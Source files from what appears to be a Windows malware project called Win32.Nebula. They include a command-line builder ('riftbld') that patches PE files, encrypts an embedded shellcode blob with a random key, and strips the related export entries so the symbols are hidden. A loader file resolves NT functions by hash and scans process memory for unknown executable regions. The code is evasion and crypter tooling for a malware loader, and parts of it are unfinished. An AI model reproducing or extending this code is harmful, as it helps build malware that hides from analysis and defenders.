	UnmapViewOfFile(m_Mapping);
	CloseHandle(m_hMap);
	FlushFileBuffers(m_hFile);
	CloseHandle(m_hFile);
}

void*  FileMap::Data() const { return m_Mapping; }
size_t FileMap::Size() const { return m_FileSize; }
#pragma endregion

```

`src/riftbld/main.cpp`:

```cpp
// NebulaBuilder - A commandline utility used to configure, patch/modify and build Nebula / the core
#include "bld.h"

// TODO: minor improvments and better error reporting (if im in the mood)
//       expand robustnest and maybe add support for nested operations
struct Opr {
#pragma region Structure
	wchar* Comment;          // A string of the commandline from start til the OperatorTag

	u32    OperatorTag;      // The operator name (Tag), e.g. "/*rc*"
	struct Parameter {
		u32    ParameterTag; // The name of the Parameter (Tag), e.g. "-*fi*:"ply.dll""
		wchar* Argument;     // The argument string of the parameter, e.g. "-fi:*ply.dll*"
	}     *ParameterList;    // An array of Parameters
	u16    ParameterCount;   // The number of parameters that were parsed a-z Flags,
	u32    Flags;            // letter is taken as a offset relatve to 'a' in the ascii table
	                         // and is mapped onto the 32-Bit bitmap
#pragma endregion

	Opr(                                // Initializes the commandline struct
		_In_z_ const wchar* CommandLine // the string to be used as the commandline
	) {
		// Future proving for more extensive exceptionhandling
		void* ExceptionParameterList[EXCEPTION_MAXIMUM_PARAMETERS];
		ExceptionParameterList[0] = this;
		memset(this, 0, sizeof(*this));

		auto Heap = GetProcessHeap();
		auto Iterator = CommandLine;
		auto CmdlLength = wcslen(CommandLine);

		// Get actual Commandline end
		while (Iterator[CmdlLength - 1] == ' ')
			CmdlLength--;

		// Find beginning of the operation and parse comment/operator
		while (Iterator <= CommandLine + CmdlLength) {
			if (*Iterator == L'/') {
				if (Iterator - CommandLine > 1) { // Parse comment if available
					size_t CommentLength = (ptr)(Iterator - 1) - (ptr)CommandLine;
					Comment = (wchar*)HeapAlloc(Heap, 0, CommentLength + sizeof(*Comment));
					memcpy(Comment, CommandLine, CommentLength);
					Comment[CommentLength / sizeof(*Comment)] = L'\0';
				}

				// Parse Tag
				auto TagEnd = FindDelimiter(++Iterator);
				size_t TagSize = ((ptr)TagEnd - (ptr)Iterator) / 2;
				if (TagSize > 4) // Check that tag is not longer than 4 chars
					RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_DATA), 0, 0, nullptr);
				for (auto i = 0; i < TagSize; i++)
					((char*)&OperatorTag)[i] = (char)Iterator[TagSize - (i + 1)];
				Iterator = TagEnd + 1;
				break;
			}

			Iterator = FindDelimiter(Iterator) + 1;
			if (!Iterator)
				RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_POINTER), 0, 0, nullptr);
		}

		// Parse string until we hit the end of the string
		while (Iterator <= CommandLine + CmdlLength) {
			auto Delimiter = FindDelimiter(Iterator);

			if (*Iterator == L'-') {
				// Find Colon Delimiter (Max at position 5 supported (Tag size 4 chars))
				const wchar* ColonDelimiter = nullptr;
				for (auto i = ++Iterator; i < Delimiter; i++)
					if (*i == L':') {
						ColonDelimiter = i;
						break;
					}

				if (ColonDelimiter) { // Parameter Argument Pair
					if (ParameterList) {
						ParameterList = (Parameter*)HeapReAlloc(Heap, 0, ParameterList, ++ParameterCount * sizeof(Parameter));
					} else
						ParameterList = (Parameter*)HeapAlloc(Heap, 0, ++ParameterCount * sizeof(Parameter));

					// Validate Parameter Integrity
					if (ColonDelimiter - Iterator > 4  || // Tag to big (tag longer than 4 chars)
						ColonDelimiter == Iterator + 1)   // Colon follows parameter descriptor ("-:")
						RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_DATA), 0, 0, nullptr);

					// Convert Tag and Argument to pair
					size_t TagSize = ((ptr)ColonDelimiter - (ptr)Iterator) / 2;
					if (TagSize > 4) // Check that tag is not longer than 4 chars
						RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_DATA), 0, 0, nullptr);
					auto& Tag = ParameterList[(ParameterCount - 1)].ParameterTag = 0;
					for (auto i = 0; i < TagSize; i++)
						((char*)&Tag)[i] = (char)Iterator[TagSize - (i + 1)];;
					Iterator = ColonDelimiter + 1;

					auto ParameterIndex = (ParameterCount - 1);
					if (ColonDelimiter + 1 != Delimiter) {
						size_t ArgumentLength = (ptr)Delimiter - (ptr)Iterator;
						auto& Argument = ParameterList[ParameterIndex].Argument;
						if (*Iterator == L'"')
							Iterator++, ArgumentLength -= 4;
						Argument = (wchar*)HeapAlloc(Heap, 0, ArgumentLength + 2);
						memcpy(Argument, Iterator, ArgumentLength);
						Argument[ArgumentLength / sizeof(wchar)] = L'\0';
					} else // Colon is followed by non existent parameter ("-x: ...")
						ParameterList[ParameterIndex].Argument = nullptr;
				} else // Initialize flag list
					while (Iterator < Delimiter)
						Flags |= 1 << (*Iterator++ - L'a');
			} else
				RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_DATA), 0, 0, nullptr);

			if (!*(Iterator = Delimiter)++) // Set Iterator to next location, incase its the end of the string exit
				break;
		}
	}
	~Opr() { // deconstructs the object
		auto m_Heap = GetProcessHeap();
		if (Comment)
			HeapFree(m_Heap, 0, (void*)Comment);
		if (ParameterList) {
			for (u8 i = 0; i < ParameterCount; i++)
				if (ParameterList[i].Argument)
					HeapFree(m_Heap, 0, (void*)ParameterList[i].Argument);
			HeapFree(m_Heap, 0, (void*)ParameterList);
		}
	}

	u16 GetTagIndex(
		_In_ u32 ParameterTag
	) {
		for (auto i = 0; i < ParameterCount; i++)
			if (ParameterList[i].ParameterTag == ParameterTag)
				return (u16)i;
		return (u16)-1;
	}

	const wchar* GetArgumentForTag(
		_In_ u32 ParameterTag
	) {
		const wchar* Argument = nullptr;
		for (auto i = 0; i < ParameterCount; i++)
			if (ParameterList[i].ParameterTag == ParameterTag) {
				Argument = ParameterList[i].Argument; break;
			}
		return Argument;
	}

private:
	const wchar* FindDelimiter(     // Searches for a commandline Delimiter
		_In_ const wchar* SubString // The starting point from whhere to search
	) {
		bool ObjectFlag = false;

		while (*SubString) {
			switch (*SubString) {
			case L' ':
				if (!ObjectFlag)
					return SubString;
				break;
			case L'"':
				ObjectFlag = !ObjectFlag;
			}

			SubString++;
		}

		if (!ObjectFlag)
			return SubString;
		return nullptr; // Invalid data
	}
};

#define HelpDialogue(Text) if (Op.GetTagIndex('help') != (u16)-1) {\
                              Con->PrintF(Text);\
                              return SUCCESS;\
                          }
status NebulaBuilder( // The actual builder code repsonsible for recompiling and building the image
	_In_ void* PeStream,
	_In_ Opr& Op
) {
	auto ProcessHeap = GetProcessHeap();

	switch (Op.OperatorTag) {
	case 'ps': // pack section
		{
			HelpDialogue(L"Packs a section in the physical image:\n")

			auto NtHeader = utl::GetNtHeader(PeStream);

			// Get section information
			Con->PrintFEx(CON_INFO, L"Retrieving section information");
			char SectionName[8] = { 0 };
			{
				auto SectionParameter = Op.GetArgumentForTag('sec');
				auto y = wcslen(SectionParameter);
				if (y > 8) // Check that the section name is not to long
					return S_CREATE(SS_ERROR, SF_BUILDER, SC_TOO_LONG);
				for (auto j = 0; j < y; j++) // Copy section name to ascii buffer
					SectionName[j] = (char)SectionParameter[j];
				memset(SectionName + y, 0, 8 - y);
			}
			auto SectionHeader = utl::FindSection(NtHeader, SectionName);

			// Pack section
			if (CHECK_BMPFLAG(Op.Flags, 'p')) {

			}

			// Crypt section
			if (CHECK_BMPFLAG(Op.Flags, 'c')) {
				// Initialize RC4
				u32 RtlState;

			#define KEY_SIZE 16
				byte RandomKey[KEY_SIZE];
				for (auto i = 0; i < KEY_SIZE / 4; i++)
					((u32*)RandomKey)[i] = RtlRandomEx(&RtlState);



			}

		} break;

	case 'ree': // remove export entry
		{
			HelpDialogue(L"Removes an export entry from the export section,\n"
				L"All links to the Data are purged form the image, the data is left intact."
				L"\"fi\" : Executable to modify\n"
				L"\"en\" : ExportName to be destroyed\n"
				L"    This can be a direct name or an ordinal designated by an '@'\n"
				L"    e.g. -en:NbConfig or -en:@13 (ordinals are unbiased)\n"
				L"    BY ORDINAL IS CURRENTLY NOT FULLY SUPPORTED, ONLY REMOVES ADDRESS ENTRY!")

			// Get ExportDirectory
			auto NtHeader = utl::GetNtHeader(PeStream);
			auto ExportDirectory = (IMAGE_EXPORT_DIRECTORY*)((ptr)img::TranslateRvaToPa(PeStream,
				NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) + (ptr)PeStream);
			Con->PrintFEx(CON_INFO, L"ExportDirectory at 0x%08x", (ptr)ExportDirectory - (ptr)PeStream);

			auto ExportName = Op.GetArgumentForTag('en');
			if (!ExportName)
				return S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_POINTER);
			auto Ordinal = (u16)-1; // Set to invalid ordinal by default

			if (*ExportName != L'@') { // Find ordinal of export
				// Enumerate ExportNameTable and find matching entry
				auto ExportNameTable = (u32*)((ptr)img::TranslateRvaToPa(PeStream, ExportDirectory->AddressOfNames) + (ptr)PeStream);
				Con->PrintFEx(CON_INFO, L"ExportNameTable at 0x%08x", (ptr)ExportNameTable - (ptr)PeStream);

				// Convert Unicode to ascii string
				auto ExportNameLength = wcslen(ExportName);
				auto AnsiExportName = (char*)HeapAlloc(ProcessHeap, 0, ExportNameLength + 1);
				WideCharToMultiByte(CP_ACP, 0, ExportName, -1, AnsiExportName, ExportNameLength + 1, 0, 0);

				// Find exportname
				for (auto i = 0; i < ExportDirectory->NumberOfNames; i++) {
					auto ExportedName = (char*)((ptr)img::TranslateRvaToPa(PeStream, ExportNameTable[i]) + (ptr)PeStream);

					if (!strcmp(ExportedName, AnsiExportName)) {
						Con->PrintFEx(CON_INFO, L"Exported name found at 0x%08x", (ptr)ExportedName - (ptr)PeStream);
						auto ExportOrdinalTable = (u16*)((ptr)img::TranslateRvaToPa(
							PeStream, ExportDirectory->AddressOfNameOrdinals) + (ptr)PeStream);
						Con->PrintFEx(CON_INFO, L"ExportOrdinalTable at 0x%08x", (ptr)ExportOrdinalTable - (ptr)PeStream);

						// Remove ordinal and namerva from tables, destroy string
						Ordinal = ExportOrdinalTable[i];
						memmove(ExportNameTable + i, ExportNameTable + (i + 1),
							(ExportDirectory->NumberOfNames - (i + 1)) * sizeof(u32));
						ExportNameTable[i + 1] = null;
						memmove(ExportOrdinalTable + i, ExportOrdinalTable + (i + 1),
							(ExportDirectory->NumberOfNames - (i + 1)) * sizeof(u16));
						ExportOrdinalTable[i + 1] = null;
						memset(ExportedName, null, ExportNameLength);

						ExportDirectory->NumberOfNames--;
						Con->PrintFEx(CON_SUCCESS, L"Destroyed name and fixed up tables");
						break;
					}
				}

				HeapFree(ProcessHeap, 0, AnsiExportName);
			} else // directly use ordinal
				Ordinal = (u16)_wtoi(ExportName + 1);

			if (Ordinal != (u16)-1) {
				if (Ordinal > ExportDirectory->NumberOfFunctions) {
					Con->PrintFEx(CON_ERROR, L"Ordinal outside of ExportAddressTable: @%d", Ordinal);
					return S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_PARAMETER);
				}

				// Remove export rva from eat
				auto ExportAddressTable = (u32*)((ptr)img::TranslateRvaToPa(PeStream,
					ExportDirectory->AddressOfFunctions) + (ptr)PeStream);
				Con->PrintFEx(CON_INFO, L"ExportAddressTable at 0x%08x", (ptr)ExportAddressTable - (ptr)PeStream);

				// IMPROVEMENT: not only destroy the entry but compress the table and relink the ordinals in the ordinal table
				ExportAddressTable[Ordinal] = null;
				Con->PrintFEx(CON_SUCCESS, L"Removed Export @%d, at 0x%08x", Ordinal, (ptr)(ExportAddressTable + Ordinal) - (ptr)PeStream);
			} else
				Con->PrintFEx(CON_WARNING, L"Export not found");
		} break;

	case 'spp': // section page protection
		{
			HelpDialogue(L"Sets the section characteristics of the spefied section\n"
				L"\"fi\" : the executable to patch\n"
				L"\"sc\" : teh sectionname of the header to patch\n"
				L"\"ch\" : the protection / characteristics to use in hex")

			auto NtHeader = utl::GetNtHeader(PeStream);

			// Get Argument
			auto SectionName = Op.GetArgumentForTag('sc');
			auto SectionNameLength = wcslen(SectionName);
			if (SectionNameLength > 8) {
				Con->PrintFEx(CON_ERROR, L"Section name specified invalid");
				return S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_PARAMETER);
			}

			// Find Section
			char SectionNameBuffer[8];
			for (auto i = 0; i < SectionNameLength; i++)
				SectionNameBuffer[i] = (char)SectionName[i];
			memset(SectionNameBuffer + SectionNameLength, 0, 8 - SectionNameLength);
			auto SectionHeader = utl::FindSection(NtHeader, SectionNameBuffer);
			if (!SectionHeader) {
				Con->PrintFEx(CON_ERROR, L"Could not retrieve section");
				return S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_POINTER);
			}
			Con->PrintFEx(CON_INFO, L"Sectionheader located at 0x%08x", (ptr)SectionHeader - (ptr)PeStream);

			auto Protection = Op.GetArgumentForTag('ch');
			u32 ProtectionVar;
			if (swscanf_s(Protection, L"%lx", &ProtectionVar) != 1) {
				Con->PrintFEx(CON_ERROR, L"Invalid characteristic !");
				return S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_PARAMETER);
			}
			SectionHeader->Characteristics = ProtectionVar;
			Con->PrintFEx(CON_SUCCESS, L"Sectioncharacteristics set at location 0x%08x",
				(ptr)&SectionHeader->Characteristics - (ptr)PeStream);
		} break;

	case 'ccsc': // code cipher shellcode
		{
			HelpDialogue(L"encodes the shellcode rc4 cipher used for the .nb2 section\n"
				L"\"fi\" : the executable used for the ciphering")

			auto TargetFile = Op.GetArgumentForTag('fi');

			// Get xor code key location and set key
			u64* XorKey;
			auto Status = img::GetExportImageAddress(PeStream, "NbRc4ModShellCodeKey", (void*&)XorKey);
			if (!S_SUCCESS(Status))
				return Status;
			u32 RtlState;
			*XorKey = (u64)RtlRandomEx(&RtlState) << 32 | RtlRandomEx(&RtlState);
			Con->PrintFEx(CON_INFO, L"NbRc4ModShellCodeKey at 0x%08x set to 0x%016llx", (ptr)XorKey - (ptr)PeStream, *XorKey);

			// Remove ShellCodeKey export
			Status = RunChildService(PeStream, L"/ree -fi:%s -en:%s", TargetFile, L"NbRc4ModShellCodeKey");
			if (!S_SUCCESS(Status))
				return Status;

			// Get cipher shellcode location and xor encode
			u8* rc4modsc;
			Status = img::GetExportImageAddress(PeStream, "NbRc4ModShellCode", (void*&)rc4modsc);
			if (!S_SUCCESS(Status))
				return Status;
			Con->PrintFEx(CON_INFO, L"Ciphering Rc4ModShellCode at 0x%08x", (ptr)rc4modsc - (ptr)PeStream);
			for (auto i = 0; i < 0x1d4; i++)
				rc4modsc[i] = _rotr8(rc4modsc[i] ^ ((u8*)XorKey)[i & 0x7], i & 0x3);

			// Remove ShellCode export
			Status = RunChildService(PeStream, L"/ree -fi:%s -en:%s", TargetFile, L"NbRc4ModShellCode");
			if (!S_SUCCESS(Status))
				return Status;
			Con->PrintFEx(CON_SUCCESS, L"Successfully crypted shellcode and removed entries.");
		} break;

	default:
		Con->PrintF(L"Unrecognized Command/Operation\n"
			L"A List of known operations is provided below,\n"
			L"for a better descriptions of each operation use the \"-help:\" tag");
	}

	return SUCCESS;
}
#undef HelpDialogue

status RunChildService(                // Runs a sub service Builder instance
	_In_           void*  Buffer,      // The buffer to work on
	_In_z_   const wchar* CommandLine, // Commandline template used for the builder
	_In_opt_                      ...  // arguments used for commandline template
) {
	Con->m_BaseIndent += 4;

	// Create commandline from template
	auto CommandLineBuffer = (wchar*)VirtualAlloc(nullptr, PAGE_SIZE, MEM_ALLOC, PAGE_READWRITE);
	va_list VariableArgumentList;
	va_start(VariableArgumentList, CommandLine);
	vswprintf_s(CommandLineBuffer, PAGE_SIZE / sizeof(wchar), CommandLine, VariableArgumentList);
	va_end(VariableArgumentList);

	// Create Commandline and run Builder
	Opr Op(CommandLineBuffer);
	auto Status = NebulaBuilder(Buffer, Op);

	VirtualFree(CommandLineBuffer, 0, MEM_RELEASE);

	Con->m_BaseIndent -= 4;
	return Status;
}

// This Entrypoint needs some serious rework :flushed:
i32 BuilderEntry() {
	SetUnhandledExceptionFilter([](_In_ EXCEPTION_POINTERS* ExceptionInfo) -> long {
			Con->PrintFEx(CON_ERROR, L"Unhandle exception occurred @ 0x%016llx !", ExceptionInfo->ExceptionRecord->ExceptionAddress);
			if (S_SUCCESS(DbgCreateDump(nullptr, ExceptionInfo))) {
				Con->PrintFEx(CON_WARNING, L"Created minidumpfile in current directory.");
				ExitProcess(ExceptionInfo->ExceptionRecord->ExceptionCode);
			} else {
				Con->PrintFEx(CON_ERROR, L"Failed to dump process, halting process for debugger.");
				NtSuspendProcess(GetCurrentProcessId());
			}

			return EXCEPTION_CONTINUE_SEARCH;
		});
	Con = new Console;

	// Create Commandline
	Opr* Op = nullptr;
	__try {
		Op = new Opr(GetCommandLineW());
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		delete Op;
		Con->PrintFEx(CON_ERROR, L"Invalid commandline syntax");
		return S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_COMMAND);
	}
	// Prolouge End


	// Load executable
	auto TargetFile = Op->GetArgumentForTag('fi');
	void* PeStream = nullptr;

	FileMap* File = nullptr;
	if (TargetFile) {
		File = new FileMap(TargetFile);
		PeStream = File->Data();
		if (!PeStream)
			return S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_POINTER);
		Con->PrintFEx(CON_INFO, L"Loaded executable");
	}

	auto Status = NebulaBuilder(PeStream, *Op);
	if (!S_SUCCESS(Status))
		Con->PrintFEx(CON_ERROR, L"Last status code: 0x%08x", Status);
	delete File;

	// Epiloge Start
	delete Op;
	delete Con;
	return Status;
}

```

`src/riftbld/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by riftbld.rc
//
#define IDI_NEBULAICO                   101

// Next default values for new objects
//
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`src/riftbld/riftbld.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 72,69,66,74
 PRODUCTVERSION 72,69,66,74
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "000004b0"
        BEGIN
            VALUE "FileDescription", "riftbld - Builder for riftldr"
            VALUE "FileVersion", "72.69.66.74"
            VALUE "InternalName", "r!bld"
            VALUE "LegalCopyright", "Lima X © 2k2o"
            VALUE "OriginalFilename", "riftbld.exe"
            VALUE "ProductName", "Win32.Nebula"
            VALUE "ProductVersion", "v2"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0, 1200
    END
END


/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_NEBULAICO           ICON                    "D:\\dev\\repos\\Win32.Nebula\\res\\NebulaB24.ico"

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`src/riftbld/riftbld.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="bld.cpp" />
    <ClCompile Include="ioc.cpp" />
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="bld.h" />
    <ClInclude Include="resource.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="riftbld.rc" />
  </ItemGroup>
  <ItemGroup>
    <Image Include="..\..\res\NebulaB24.ico" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{5edaecc5-bb9d-4cdd-abf8-d8c0306a2749}</ProjectGuid>
    <RootNamespace>riftbld</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
    <Import Project="..\shr\shr.vcxitems" Label="Shared" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <ExceptionHandling>false</ExceptionHandling>
      <RuntimeLibrary />
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <PreprocessorDefinitions>_DEBUG</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <EntryPointSymbol>BuilderEntry</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>
      </PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <RuntimeLibrary>
      </RuntimeLibrary>
      <ExceptionHandling>false</ExceptionHandling>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>DebugFull</GenerateDebugInformation>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
      <ShowProgress>LinkVerbose</ShowProgress>
      <LinkStatus>true</LinkStatus>
      <EntryPointSymbol>BuilderEntry</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`src/riftbld/riftbld.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="src">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="res">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="hdr">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>src</Filter>
    </ClCompile>
    <ClCompile Include="bld.cpp">
      <Filter>src</Filter>
    </ClCompile>
    <ClCompile Include="ioc.cpp">
      <Filter>src</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="bld.h">
      <Filter>hdr</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>hdr</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="riftbld.rc">
      <Filter>res</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <Image Include="..\..\res\NebulaB24.ico">
      <Filter>res</Filter>
    </Image>
  </ItemGroup>
</Project>
```

`src/riftldr/are.cpp`:

```cpp
#include "ldr.h"

#pragma region MemoryScanner
typedef _Must_inspect_result_ NTSTATUS(NTAPI * ntqvm_t)(
	_In_                                        HANDLE  ProcessHandle,
	_In_opt_                                    PVOID   BaseAddress,
	_In_                                        ULONG   MemoryInformationClass, // Always set to 0
	_Out_writes_bytes_(MemoryInformationLength) PVOID   MemoryInformation,
	_In_                                        SIZE_T  MemoryInformationLength,
	_Out_opt_                                   PSIZE_T ReturnLength
);

class MemoryScan {
	struct MemoryRegion {
		void*  VirtualAddress;
		size_t RegionSize;
	};

public:
	MemoryScan() {
		m_ExclusionList = HeapCreate(0, HEAP_GENERATE_EXCEPTIONS, 0);
	}
	~MemoryScan() {
		HeapDestroy(m_ExclusionList);
	}

	status ScanVirtualMemory() {
		void* Iterator = nullptr;
		auto SuspiciousRegionCount = 0;

		auto NtQueryVirtualMemory = (ntqvm_t)ldr::ImportFunctionByHash(
			ldr::GetModuleHandleByHash(N_NTDLL), N_NTQUERYVM);

		// Enumerate all Usermode Memory
		while ((ptr)Iterator < ((ptr)1 << 48)) {
			MEMORY_BASIC_INFORMATION mbi;
			VirtualQuery(Iterator, &mbi, sizeof(mbi));

			if (mbi.State == MEM_COMMIT) {
				if (mbi.Protect & 0b11110001) { // Suspicious page protections (executable / noaccess)
					// Check if found region is within an exclusion
					MemoryRegion* mreg;
					auto Status = SearchListForExclusion(mbi.BaseAddress, mbi.RegionSize, mreg);
					if (S_CODE(Status) == SC_NOT_FOUND) {
						// Region is not within an exclusion,
						SuspiciousRegionCount++;
						TracePoint(DBG_WARNING, "Unknown executable region found!\n"
							"Address/Size: 0x%016llx / 0x%08x\n"
							"Protect: %08x, AllocProt: %08x ",
							mbi.BaseAddress, mbi.RegionSize,
							mbi.Protect, mbi.AllocationProtect);
					}
				}
			}

			(ptr&)Iterator += mbi.RegionSize;
		}

		if (SuspiciousRegionCount)
			return S_CREATEM(SuspiciousRegionCount);
		return SUCCESS;
	}

